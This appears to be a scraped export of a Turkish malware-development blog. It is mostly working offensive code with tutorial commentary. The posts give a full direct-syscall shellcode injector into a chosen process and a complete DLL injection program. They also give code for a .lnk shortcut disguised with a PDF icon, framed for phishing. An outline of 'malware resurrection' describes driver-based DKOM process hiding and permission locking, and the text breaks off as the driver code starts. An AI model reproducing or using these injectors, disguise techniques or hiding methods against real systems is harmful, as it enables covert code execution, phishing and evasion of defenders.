güncelleyelim:\n.data extern NtOpenProcessSSN:DWORD extern NtAllocateVirtualMemorySSN:DWORD extern NtWriteVirtualMemorySSN:DWORD extern NtCreateThreadExSSN:DWORD extern NtWaitForSingleObjectSSN:DWORD extern NtCloseSSN:DWORD .code My_NtOpenProcess PROC mov r10, rcx mov eax, NtOpenProcessSSN syscall ret My_NtOpenProcess ENDP My_NtAllocateVirtualMemory PROC mov r10, rcx mov eax, NtAllocateVirtualMemorySSN syscall ret My_NtAllocateVirtualMemory ENDP My_NtWriteVirtualMemory PROC mov r10, rcx mov eax, NtWriteVirtualMemorySSN syscall ret My_NtWriteVirtualMemory ENDP My_NtCreateThreadEx PROC mov r10, rcx mov eax, NtCreateThreadExSSN syscall ret My_NtCreateThreadEx ENDP My_NtWaitForSingleObject PROC mov r10, rcx mov eax, NtWaitForSingleObjectSSN syscall ret My_NtWaitForSingleObject ENDP END Daha sonra main.h header dosyasını güncelleyelim:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L DWORD NtOpenProcessSSN; DWORD NtAllocateVirtualMemorySSN; DWORD NtWriteVirtualMemorySSN; DWORD NtCreateThreadExSSN; DWORD NtWaitForSingleObjectSSN; DWORD NtCloseSSN; #pragma region STRUCTURES typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; #pragma endregion extern NTSTATUS My_NtOpenProcess( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); extern NTSTATUS My_NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); extern NTSTATUS My_NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); extern NTSTATUS My_NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); extern NTSTATUS My_NtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); Son olarak ise main.c projemizi güncelleyelim:\n#include \"main.h\" char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x44\\x69\\x72\\x65\\x63\\x74\\x20\\x53\\x79\\x73\" \"\\x74\\x65\\x6d\\x63\\x61\\x6c\\x6c\\x73\\x20\\x77\\x69\\x74\\x68\\x20\" \"\\x62\\x65\\x6b\\x6f\\x6f\\x22\"; size_t ShellcodeSize = sizeof(Shellcode); DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) { printf(\"\\n***** %s *****\\n\", ProcName); DWORD sysCallNumber = 0; UINT_PTR targetNtFunction; targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName); if (targetNtFunction == 0) { printf(\"%s handle retrieval failed Error Code: 0x%lx\\n\", ProcName, GetLastError()); return -1; } sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0]; printf(\"SSN number for the %s successfully received! 0x%lx\\n\", ProcName, sysCallNumber); return sysCallNumber; } int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; PVOID RemoteBuffer = NULL; HMODULE NTDLLAddress = GetModuleHandleW(L\"ntdll.dll\"); CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = STATUS_SUCCESS; NtOpenProcessSSN = GetSSN(NTDLLAddress, \"NtOpenProcess\"); Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtAllocateVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtAllocateVirtualMemory\"); Status = My_NtAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"NtAllocateVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtWriteVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtWriteVirtualMemory\"); Status = My_NtWriteVirtualMemory(HandleProcess, RemoteBuffer, Shellcode, ShellcodeSize, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWriteVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtCreateThreadExSSN = GetSSN(NTDLLAddress, \"NtCreateThreadEx\"); Status = My_NtCreateThreadEx(\u0026HandleThread, THREAD_ALL_ACCESS, NULL, HandleProcess, (LPTHREAD_START_ROUTINE)RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtCreateThreadEx failed! Error Code: 0x%lx\\n\", Status); return 1; } NtWaitForSingleObjectSSN = GetSSN(NTDLLAddress, \"NtWaitForSingleObject\"); Status = My_NtWaitForSingleObject(HandleThread, FALSE, NULL); if (Status != STATUS_SUCCESS) { printf(\"NtWaitForSingleObject failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 1; } printf(\"Shellcode executed successfully\\n\"); CloseHandle(HandleThread); CloseHandle(HandleProcess); return 0; } Kodların neler yaptığını bildiğimiz için anlatmama gerek yok direkt olarak sonucu görelim:\nSonuç Bu konuda user mode programdan direkt olarak nasıl syscall yapılır bunu gördük.\nUmarım konu sizin için faydalı olmuştur. Diğer blogta görüşmek üzere.\nReferences Wikipedia - System Call\nREDOPS - Direct Syscalls: A journey from high to low","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":"","system-call-nedir#\u003cstrong\u003eSystem Call Nedir?\u003c/strong\u003e":""},"title":"Direct Syscalls"},"/docs/malware-dev/dll-injection/":{"data":{"":"","dll-injection#\u003cstrong\u003eDLL Injection\u003c/strong\u003e":"","dll-kodlama#DLL kodlama":"","dll-nedir#\u003cstrong\u003eDLL Nedir?\u003c/strong\u003e":"","kod#Kod":"","references#\u003cstrong\u003eReferences\u003c/strong\u003e":"Merhabalar. Bu blogta DLL Injection tekniğini inceleyeceğiz.\nDLL Nedir? DLL (Dynamic Link Library), aynı anda birden fazla program tarafından kullanılan kod ve veri içeren kütüphanelerdir. Windows işletim sisteminde bir program çalıştırdığınızda veya Windows işletim sistemi bir işlevi yerine getirmek istediği zaman DLL’leri şeyi kullanır.\nBu kütüphaneler, genellikle yukarıda bahsettiğim gibi birden fazla uygulamada ortak olan kodları, işlevleri veya kaynakları içerir. Bu, kod tekrarını azaltır ve uygulama boyutlarını küçültür. DLL’ler, yalnızca gerektiğinde belleğe yüklenir ve bu da sistem kaynaklarının verimli kullanılmasını sağlar.\nArtık teorik olarak DLL‘in ne olduğunu biliyoruz ama bu teknikte ne yapıyoruz? Bir de buna bakalım.\nDLL kodlama Bu konuda sadece “DLL budur” diyerek konuyu teorik olarak bırakmak istemiyorum. DLL’in ne olduğu kafamızda daha netleşmesi açısından Visual Studio ortamında DLL projesi oluşturacağız ve basitçe kodlamasını yapacağız. Ardından ise DLL Injection yöntemi ile hazırladığımız DLL’i enjekte edeceğiz. “DLL için kodlamayı nasıl yapacağız?” gibi sorularla kafanızda bir şüphe oluşmasın. DLL’ler C/C++ dilleriyle kodlanıyor, dolayasıyla geliştirmemiz zor olmayacak.\nVisual Studio açalım ve Create a new Project’e tıklayalım ve arama yerine ‘Dynamic’ diye aratalım:\nArdından bunu seçelim ve projemize isim vererek projeyi oluşturalım. Proje oluşturulduktan sonra aşağıdaki kodlar bizi karşılıyor olacak:\nDLL’lerin main alanı DllMain’dir. Tıpkı C projelerimizde nasıl main fonksiyonuna kod yazıyorsak, DLL projelerinde de başlangıç noktası burasıdır. Ancak burada bir fark var: DllMain fonksiyonu, birkaç özel parametre alır ve bu parametreler DLL’in yaşam döngüsünü yönetmek için kullanılır.\nDllMain’in parametreleri:\nhModule: Bu parametre, DLL’nin yüklendiği modülün bir tanıtıcısıdır (handle). Bu, genellikle DLL’nin bellek adresine işaret eder ve işlem boyunca benzersizdir. ul_reason_for_call: Bu, DLL’nin hangi sebeple çağrıldığını belirtir. Özellikle bunu aklınızda tutun çünkü birazdan aşağıda daha detaylı ele alacağım. lpReserved: Yükleme ve boşaltma sırasında ek bilgi taşımak için kullanılır. Bu parametre genellikle nadiren kullanılır. DLLMain içerisindeki switch-case yapısı, ul_reason_for_call parametresine göre çalışır. Bu parametre, DLL’in hangi durumda olduğunu belirtir. Burada dört farklı durum vardır ve bunları sırayla inceleyelim:\nDLL_PROCESS_ATTACH: Bu, DLL’nin bir işlem tarafından ilk kez yüklendiği anlamına gelir. Yani program çalışırken DLL’yi kullanmaya başladığında buraya geliriz. DLL_THREAD_ATTACH: Eğer programınız içinde yeni bir thread oluşturulursa, bu durum devreye girer. Örneğin, thread’e özel veriler veya ayarlar yapmak isterseniz bu durumda kod yazabilirsiniz. DLL_THREAD_DETACH: Bu, bir iş parçacığı sona erdiğinde çağrılır. İş parçacığıyla ilişkili özel kaynakları serbest bırakmak veya temizlik işlemleri yapmak için burayı kullanabilirsiniz. DLL_PROCESS_DETACH: DLL artık kullanılmadığında veya program kapatıldığında bu durum gerçekleşir. Yani program kapanmadan önce ne gerekiyorsa bu kısımda yapılır. Son olarak, TRUE döndürmek DLL’in başarıyla yüklendiğini veya çalıştığını belirtir. Eğer bir sorun oluştuysa, FALSE döndürebiliriz. Ancak TRUE genellikle varsayılan seçenektir.\nBizim kodlama için ilgileneceğimiz durum, DLL_PROCESS_ATTACH olacaktır. Şimdi burada basit bir kodlama yapalım:\nTekrarlamaktan zarar gelmez, DLL_PROCESS_ATTACH alanında kodladığıma dikkat edin. Burada basitçe MessageBoxA kullanarak bir “Ben zararsiz bir dllim” mesajını ekrana bastırıyoruz (mesajı yazarken ben bile zararsız olduğuna inandım). Hedef process bu DLL yüklediği zaman bu kod çalıştırılmış olacak.\nSolution Explorer‘da projemize sağ tıklayıp Rebuild seçeceğine tıklayalım ve /x64/Debug dizininden oluşturulan .dll’e göz atalım:\nGöründüğü gibi bir .dll ve .pdb dosyaları elde ediyoruz. Bu .dll dosyasını erişebileceğiniz başka bir yere kaydedebilirsiniz. Tekniği kullanırken .dll dosyanın tam yoluna ihtiyacımız olacak.\nŞimdi ise tekniğimizi inceleyelim.\nDLL Injection Artık temelde bir DLL’in ne olduğunu ve basitçe kodlamasını biliyoruz.\nDLL Injection tekniği, bir process içerisine zararlı DLL’in enjekte edilmesi içerir. Tıpkı önceki konumuzda yaptığımız gibi zararlı shellcode’u enjekte etmek gibi düşünün.\nYüklenen zararlı DLL ile artık amacınız ne ise ona göre Process’in davranışını değiştirebilirsiniz. Kulağada ne kadar da sadece Malware Development için kullanılan bir teknik gibi algılansa da debugging için amaçlarla da kullanıldığını burada vurgulamak isterim.\nHatırlarsanız önceki konumuzda elimizdeki shellcode’u hedef process’e gömüyorduk bellek aracılığıyla. Dediğim gibi bu yöntemi de bunun gibi düşünebilirsiniz. Hedef Process belleğine DLL’imizin yolunu gömeceğiz ve ardından Process’in LoadLibraryW çalıştırmasını sağlayarak zararlı DLL’i yüklemiş olacak.\nKod #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e int main(int argc, char* argv[]) { DWORD PID = 0; HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; LPVOID RemoteBuffer = NULL; LPTHREAD_START_ROUTINE LoadLibraryAddress = NULL; wchar_t DllPath[MAX_PATH] = L\"C:\\\\Users\\\\bekoo\\\\bekoo.dll\"; DWORD DllPathSize = sizeof(DllPath); if (argc \u003c 2) { printf(\"Usage: %s \u003cPID\u003e\\n\", argv[0]); return 1; } PID = atoi(argv[1]); printf(\"Injecting DLL into PID %d\\n\", PID); LoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); HandleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); if (HandleProcess == NULL) { printf(\"Failed to open process\\n\"); return 1; } RemoteBuffer = VirtualAllocEx(HandleProcess, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (RemoteBuffer == NULL) { printf(\"Failed to allocate memory in remote process\\n\"); return 1; } if (!WriteProcessMemory(HandleProcess, RemoteBuffer, DllPath, DllPathSize, NULL)) { printf(\"Failed to write DLL path to remote process\\n\"); return 1; } HandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } WaitForSingleObject(HandleThread, INFINITE); printf(\"DLL injected\\n\"); return 0; } Eğer Shellcode Execution blogumu okudu iseniz bu kodlar yabancı gelmeyecektir. Çünkü neredeyse aynı şeyleri yapıyoruz birkaç şey dışında. Önceki konuda LoadLibrary gibi şeyler kullanmadık. Şimdi buna bir bakalım:\nLoadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L\"kernel32.dll\"), \"LoadLibraryW\"); if (LoadLibraryAddress == NULL) { printf(\"Failed to get LoadLibraryW address\\n\"); return 1; } printf(\"LoadLibraryW address: 0x%p\\n\", LoadLibraryAddress); Burada GetProcAddress ile kernel32.dll içerisinden LoadLibraryW API’in adresini elde ediyoruz ve alınan adres LoadLibraryAddress değişkenine aktarılıyor.\nDaha sonra bir if kontrolü yapıyoruz. Eğer GetProcAddress NULL döndürmüş ise fonksiyonun adresi alınmamış demektir ve bu yüzden programı bir hata mesajı ile kapatıyoruz. “Eee? Bu adresi nerede kullanıyoruz?” diye bir soru gelebilir hemen göstereyim:\nHandleThread = CreateRemoteThreadEx(HandleProcess, NULL, 0, LoadLibraryAddress, RemoteBuffer, 0, NULL, NULL); if (HandleThread == NULL) { printf(\"Failed to create remote thread\\n\"); return 1; } Bu adresi, CreateRemoteThreadEx’in dördüncü parametresi olan lpStartAddress’e ve ayrılan bellek adresini lpParameter olarak verdiğime dikkat edin. Buradaki amacımız hedef Process’e verilen adres, elde ettiğimiz LoadLibraryW fonksiyonun adresidir. Bu fonksiyon kullanarak hazırladığımız DLL’i yüklenmesi sağlanacaktır. RemoteBuffer değeri ise LoadLibraryW fonksiyonu için parametre olarak veriyoruz.\nDiğer kod parçaları zaten önceki blogumda anlattığım gibi aynı.\nSonuç Sonuçta gördüğümüz gibi paint uygulamasının PID değerini verdiğimizde DLL’i enjekte ediyor ve mesajımızı görüyoruz.\nUmarım sizler için faydalı olmuştur iyi çalışmalar dilerimm.\nReferences Microsoft Learn - DLL nedir? ","sonuç#\u003cstrong\u003eSonuç\u003c/strong\u003e":""},"title":"DLL Injection"},"/docs/malware-dev/file-icon-spoofing/":{"data":{"":"","code#Code":"","programı-çalıştırma#Programı Çalıştırma":"","references#References":"Merhabalar, bu yazıda File Icon Spoofing tekniğini inceleyeceğiz.\nKısaca tekniği özetlemek gerekirse oluşturulan malware’in programın icon’u değiştirilerek kullanıcıyı yanıltma tekniğidir. Bu sayede kullanıcı, ilgili malware’i zararsız bir dosya olarak görebilir. Malware için belirlediğiniz icon, bu konuda örnek olarak gösterileceği gibi bir PDF olabilir veya bir başka icon olabilir. Tekniğin, sosyal mühendislik saldırıları için oldukça etkili bir yöntem olabilir ve ayrıca Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.\nKonunun daha iyi anlaşılması için örnek senaryo üzerinden ilerleyelim, bir şirketin iç ağının güvenliğini test etmek amacıyla görevlendirilmiş bir pentester olduğunuzu düşünün. Şirket çalışanlarının kötü amaçlı dosyaları açma konusunda ne kadar dikkatli olduklarını test etmeniz gerekiyor. Bu bağlamda, kötü amaçlı yazılımınızı zararsız bir PDF dosyası olarak maskeleyerek, bir kimlik avı e-postası aracılığıyla veya paylaşılan bir klasöre yerleştirerek gönderebilirsiniz. Eğer bir çalışan bu dosyayı açarsa, dosya aslında zararlı yazılımı çalıştırarak sistemlerine erişim sağlar.\nCode Bu konu için kullandığım kod parçası, S12 H4CK’in PDF Icon File Spoofing konusundan alınmış ve tarafımca güncellenmiştir. Daha fazla detay için Referanslar kısmından makalesine göz atabilirsiniz.\nHazırlanan örnek kod parçasının github link’ine erişmek için buraya tıklayabilirsiniz.\n#include \u003cstdio.h\u003e #include \u003cstrsafe.h\u003e #include \u003cwchar.h\u003e #include \u003cShlObj.h\u003e #include \u003cobjbase.h\u003e #include \u003cWindows.h\u003e BOOL CreateShortcut(const wchar_t* TargetPath, const wchar_t* ShortcutPath, const wchar_t* IconPath ) { HRESULT HRES; IShellLink* PSL = NULL; IPersistFile* PPF = NULL; CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); return 0; } int main() { wchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; HRESULT HRFolder; HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } return 0; } Kodlara detaylıca göz atalım ve main içerisinden başlayalım:\nwchar_t TargetPath[MAX_PATH] = L\"C:\\\\Windows\\\\System32\\\\calc.exe\"; wchar_t IconPath[MAX_PATH] = L\"C:\\\\path\\\\to\\\\pdficon.ico\"; wchar_t ShortcutPath[MAX_PATH]; TargetPath: Bu değişken, oluşturulacak kısayolun hedef dosyasının yolunu belirtir. Bu değişken bizim malware’in yolunu belirtir. IconPath: Bu değişken, oluşturulacak kısayolun icon’unun yolunu belirtir. ShortcutPath: Bu değişken, oluşturulacak kısayolun yolunu belirtir. HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath); if (FAILED(HRFolder)) { wprintf(L\"Failed to get Desktop Path! Error Code: 0x%08X\\n\", HRFolder); return 1; } StringCchCatW(ShortcutPath, MAX_PATH, L\"\\\\Projects.lnk\"); wprintf(L\"Merged Path: %s\\n\", ShortcutPath); Bu kısımda ise ilk olarak SHGetFolderPath fonksiyonu ile desktop dizinin tam yolunu alıyoruz. Ardından alınan dizin yoluna ise StringCchCatW aracılığıyla oluşturulacak kısayol ismi ile birleştiriyoruz. Bu sayede oluşturulacak kısayol’un tam yolunu elde etmiş oluyoruz.\nBu kısayol ismini Projects.lnk olarak ayarladım. Siz dilerseniz bunu değiştirebilirsiniz. if (CreateShortcut(TargetPath, ShortcutPath, IconPath) \u003e 0) { wprintf(L\"Failed to create Shortcut!\\n\"); return -1; } Bu kısımda ise oluşturduğumuz CreateShortcut fonksiyonunu çağırıyoruz ve if ile bir karşılaştırma yapıyoruz. Eğer CreateShortcut fonksiyonu 0’dan yüksek yani 1 değerini döndürürse hata mesajı ekrana bastırarak -1 ile programı return ettiriyoruz. CoInitialize(NULL); HRES = CoCreateInstance(\u0026CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, \u0026IID_IShellLink, (void**)\u0026PSL); if (FAILED(HRES)) { wprintf(L\"Failed to create IShellLink Object! Error Code: 0x%08X\\n\", HRES); return 1; } CreateShortcut fonksiyon içerisinde ise ilk olarak CoInitialize fonksiyonu ile COM bileşenlerini başlatıyoruz. Peki ama neden COM bileşenlerini başlatıyoruz?\nÇünkü IShellLink ve IPersistFile interface’leri COM bileşenleridir. Bu interface’ler bizim kısayol oluşturmak için kullanacağımız araçlardır. Dolayasıyla bunlara erişmemiz için COM bileşenlerini başlatmamız gerekmektedir.\nArdından CoCreateInstance fonksiyonu ile IShellLink interface’ini oluşturuyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. PSL-\u003elpVtbl-\u003eSetPath(PSL, TargetPath); PSL-\u003elpVtbl-\u003eSetIconLocation(PSL, IconPath, 0); PSL-\u003elpVtbl-\u003eSetDescription(PSL, L\"Very important file\"); HRES = PSL-\u003elpVtbl-\u003eQueryInterface(PSL, \u0026IID_IPersistFile, (void**)\u0026PPF); if (FAILED(HRES)) { wprintf(L\"Failed to interface! Error Code: 0x%08X\\n\", HRES); return 1; } Bu kod bloğunda ise oluşturduğumuz IShellLink interface’ine Target Path, Icon Path ve Description ekliyoruz. Bu adımlar, oluşturacağımız kısayolun özelliklerini belirtir.\nArdından QueryInterface fonksiyonu ile IPersistFile interface’ine erişim sağlıyoruz. Eğer bu işlem başarısız olursa hata mesajı bastırarak programı return ettiriyoruz. HRES = PPF-\u003elpVtbl-\u003eSave(PPF, ShortcutPath, TRUE); PPF-\u003elpVtbl-\u003eRelease(PPF); PSL-\u003elpVtbl-\u003eRelease(PSL); CoUninitialize(); wprintf(L\"Shortcut Created!\\n\"); Son olarak ise Save fonksiyonu ile oluşturduğumuz kısayolu, main içerisinde oluşturduğumuz tam yoluna kaydediyoruz. Ardından IPersistFile ve IShellLink interface’lerini serbest bırakıyoruz. CoUninitialize fonksiyonu ile COM bileşenlerini sonlandırıyoruz. Son olarak kısayolun oluşturulduğuna dair bir mesaj bastırıyoruz. Programı Çalıştırma Programı çalıştırdığımızda ise masaüstünde kısayolumuz aşağıdaki gibi gözükecektir:\nKısayolumuz aslında pdf gibi gözükse de özelliklerine göz attığımızda aslında farklı bir program çalıştıracaktır:\nÖzelliklerine göz attığımızda ise aslında bu kısayolun calc.exe programını çalıştırdığını görmekteyiz.\nSonuç Bu konumda, icon file spoofing tekniğini ele aldık. Unutmayın ki bu teknik, Pentest ve Red Team çalışmalarında da kullanılışlı olabilir.\nUmarım faydalı olmuştur, teşekkürler! 🚀\nReferences S12 H4CK - PDF Icon File Spoofing ","sonuç#Sonuç":""},"title":"PDF Icon File Spoofing"},"/docs/malware-dev/malware-resurrection/":{"data":{"":"","kernel-mode-driver#Kernel Mode Driver":"","malwarein-çalıştırılması#Malware\u0026rsquo;in çalıştırılması":"","nedir-bu-malware-resurrection#Nedir bu Malware Resurrection?":"","proje#Proje":"","sonuç#Sonuç":"\nMerhabalar, bu yazıda Malware Resurrection tekniğini inceleyeceğiz.\nNedir bu Malware Resurrection? Malware Resurrection tekniği, sisteme bulaşmış ve çalışan bir malware’in bir şekilde sonlandırılması sonrasında tekrar sistemde çalışabilmesi ve kalıcılığı sağlamak için sistemde tekrar diriltmesine olanak sağlayan bir tekniktir.\nBu yöntemi gerçekleştirmek için malware’in yanında ek bir program kullanılabilir veya driver kullanılabilir. Bu program veya driver, malware’i dinlemeye alır ve kapatılması durumunda malware sisteme tekrar indirip çalıştırabilir. Kalıcılığı sağlanmak için ise çeşitli yöntemlere başvurulabilir.\nProje Hazırlanan projede user-mode program ve kernel-mode driver birlikte çalışarak kapanan malware’i tekrar diriltmek ve malware’in sistemde gizli bir şekilde çalışması için çeşitli yöntemlere başvurarak malware’in hem diritilmesi hem de gizli bir şekilde çalışması amaçlanmıştır.\nUser-mode programın en büyük amacı ilgili malware’i dinlemektir. Eğer malware bir şekilde kapanırsa, malware tekrar diriltmek için harekete geçer. Bu esnada user-mode program, malware indirmek için driver ile iletişim kurar. Driver, belirtilen yola bir gizli klasör oluşturur (projede C:\\Windows\\System32\\ klasörü kullanılmıştır).\nBu işlemden sonra user-mode programı, oluşturulan gizli klasöre malware’i indirir ve bir process oluşturur. Bu işlemden sonra user-mode program, oluşturulan process’in PID değerini, malware’in gizli bir şekilde çalışabilmesi için driver’a iletir. Driver bu PID değeriyle DKOM saldırısı gerçekleştirerek Process listesinden malware’i siler. Bu yöntem sayesinde kullanıcı, Task Manager gibi araçlar üzerinden malware’i göremez.\nSon olarak yine driver tarafından oluşturulan gizli klasörün yetkilerini değiştirir. Bu yetki değişikliği, kullanıcının klasörü silmesini ve klasör içerisindeki malware’i çalıştırmasını engeller.\nProje kodlarına göz atmak isterseniz buradaki github linkine tıklayabilirsiniz.\nKernel Mode Driver İlk olarak kernel-mode sürücüyü inceleyeceğiz:\n#pragma warning(disable: 28251 4189 4996 4152) #include \"main.h\" /* Remember to put \\\\ at the end of the path. */ UNICODE_STRING G_ExecutablePath = 